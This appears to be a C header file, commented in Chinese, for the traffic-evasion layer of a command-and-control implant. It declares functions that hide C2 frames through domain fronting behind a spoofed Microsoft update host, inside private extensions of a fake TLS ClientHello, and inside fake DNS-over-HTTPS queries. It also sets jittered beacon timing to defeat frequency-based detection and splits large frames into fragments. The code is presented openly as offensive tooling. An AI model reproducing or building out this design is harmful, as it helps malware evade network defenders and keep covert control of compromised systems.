#ifndef EVASION_H
#define EVASION_H

#include <stdint.h>
#include <stddef.h>

#define EVASION_OK        0
#define EVASION_ERR       (-1)
#define EVASION_ERR_FMT   (-2)
#define EVASION_ERR_NOMEM (-3)

/*
 * 10_evasion: 流量伪装进阶层
 *
 * 能力:
 *   (1) Domain Fronting  —— HTTP Host 头(伪装目标) 与 SNI/真实目标 分离
 *   (2) TLS ClientHello 混淆 —— C2 帧包裹成伪 ClientHello, 对端解出原帧
 *   (3) DoH 形态伪装    —— C2 帧包裹成 DNS-over-HTTPS JSON, 经 443 端口传输
 *   (4) Jitter 心跳     —— 非均匀睡眠调度, 规避固定频率检测
 *   (5) 大帧分片       —— 将超长帧拆成多个合法协议包, 对端重组
 */

/* ==================== (1) Domain Fronting ==================== */

/*
 * 构造一段 HTTP 请求, 使 Host 头与真实 TCP 目标分离。
 *   real_host : TCP 连接/TLS SNI 使用的真实 CDN 边缘节点
 *   fake_host : HTTP "Host:" 头中填入的伪装域名(前端分发域名)
 *   path      : 请求路径
 *   body      : 请求体(C2 帧)
 *   body_len  : 请求体长度
 *   out       : 输出缓冲
 *   out_len   : 输入为缓冲容量, 输出为实际写入长度
 *
 * 例: real_host="1.1.1.1", fake_host="update.microsoft.com"
 *     -> TCP 连 1.1.1.1, TLS SNI=1.1.1.1, 但 Host: update.microsoft.com
 *     审查设备只看到 SNI=1.1.1.1, 无法从 Host 头关联真实意图。
 */
int evasion_domain_front(const char *real_host, const char *fake_host,
                         const char *path,
                         const uint8_t *body, size_t body_len,
                         uint8_t *out, size_t *out_len);

/*
 * 解析 domain-fronted 响应, 提取 C2 帧体。
 * 返回 EVASION_OK 并把帧长度写入 *frame_len。
 */
int evasion_domain_front_parse_response(const uint8_t *resp, size_t resp_len,
                                        uint8_t *frame, size_t *frame_len);

/* ==================== (2) TLS ClientHello 混淆 ==================== */

/*
 * 将 C2 帧包裹成一段看起来像 TLS 1.2 ClientHello 的字节流。
 *
 * ClientHello 结构(简化):
 *   Handshake { type=1(ClientHello), len(3) }
 *     ProtocolVersion { major=3, minor=3 }
 *     Random(32)
 *     SessionIDLen(1) SessionID(...)
 *     CipherSuitesLen(2) CipherSuites(...)
 *     CompressionMethodsLen(1) CompressionMethods(1)
 *     ExtensionsLen(2) Extensions(...)
 *
 * C2 帧被切割后藏入多个 Extension 的 data 字段, 并以自定扩展类型
 * (0x7FXX, 私有区间) 携带, 合法服务器会忽略未知扩展而不断连。
 *
 * 参数:
 *   frame/frame_len : 原始 C2 帧
 *   sni             : ClientHello 中合法的 SNI(例如 "www.baidu.com")
 *   out/out_len     : 输出缓冲, 入参容量为上限, 出参为实际长度
 */
int evasion_frame_to_clienthello(const uint8_t *frame, size_t frame_len,
                                 const char *sni,
                                 uint8_t *out, size_t *out_len);

/*
 * 从伪 ClientHello 字节流中提取 C2 帧。
 * 只解析扩展段, 不做真实 TLS 握手。
 */
int evasion_clienthello_to_frame(const uint8_t *data, size_t data_len,
                                 uint8_t *frame, size_t *frame_len);

/* ==================== (3) DoH 形态伪装 ==================== */

/*
 * 将 C2 帧包裹成 DNS-over-HTTPS 请求体。
 * 标准 DoH(GET)形如:
 *   GET /dns-query?dns=<base64url-wireformat> HTTP/1.1
 *   Host: dns.google
 *
 * 我们把 C2 帧当成一个伪造的 DNS 查询报文(伪 QNAME 用随机合法字符填充)
 * 编码进 dns= 参数, 审查设备看到的是"正常 DoH 查询"。
 *
 * 参数:
 *   frame/frame_len : 原始 C2 帧
 *   doh_server      : DoH 服务器 Host(例如 "dns.google")
 *   out/out_len     : 输出完整 HTTP 请求
 */
int evasion_frame_to_doh(const uint8_t *frame, size_t frame_len,
                         const char *doh_server,
                         uint8_t *out, size_t *out_len);

/* 解析 DoH 响应体(应为 base64url 编码的 DNS 报文), 还原 C2 帧 */
int evasion_doh_to_frame(const uint8_t *resp, size_t resp_len,
                         uint8_t *frame, size_t *frame_len);

/* ==================== (4) Jitter 心跳调度 ==================== */

typedef struct {
    int base_interval_ms;   /* 基础间隔 */
    int jitter_pct;         /* 抖动幅度(百分比, 如 40 表示 ±40%) */
    uint32_t seed;          /* 可复现随机数种子 */
} jitter_sched_t;

void jitter_sched_init(jitter_sched_t *js, int base_interval_ms,
                       int jitter_pct, uint32_t seed);
/*
 * 计算下一次心跳应睡眠的毫秒数。
 * 使用线性同余生成器, 无需系统熵, 可预测, 便于测试。
 */
int jitter_sched_next(jitter_sched_t *js);

/* 睡眠直到下一次心跳到期; 返回 EVASION_OK */
int jitter_sleep(jitter_sched_t *js);

/* ==================== (5) 大帧分片 ==================== */

#define EVASION_MAX_FRAGMENTS  256
#define EVASION_FRAG_MAGIC     0xE54A  /* 0xE5 4A */

/*
 * 分片头(8 字节):
 *   magic(2) | total(2) | index(2) | reserved(2)
 * 后跟分片 payload。
 */
#define EVASION_FRAG_HEADER_LEN 8

/*
 * 将帧分片。
 * 参数:
 *   frame/frame_len : 待分片帧
 *   max_payload     : 每个分片承载的 payload 上限
 *   out_frags       : 输出分片缓冲数组(每个元素为指针)
 *   out_lens        : 每个分片的实际长度
 *   max_frags       : out_frags 数组容量
 *   frag_count      : 输出: 实际分片数
 */
int evasion_fragment(const uint8_t *frame, size_t frame_len,
                     size_t max_payload,
                     uint8_t **out_frags, size_t *out_lens,
                     size_t max_frags, size_t *frag_count);

/* 释放 fragmentation 分配的分片缓冲 */
void evasion_fragment_free(uint8_t **frags, size_t frag_count);

/*
 * 重组分片。
 * 参数:
 *   frags/lens/count : 收到的分片集合(可乱序到达)
 *   out/out_len      : 输出重组后的完整帧
 * 返回:
 *   EVASION_OK       重组完成
 *   EVASION_ERR      分片缺失或校验失败
 */
int evasion_defragment(const uint8_t **frags, const size_t *lens, size_t count,
                      uint8_t *out, size_t *out_len);

const char *evasion_strerror(int err);

#endif /* EVASION_H */
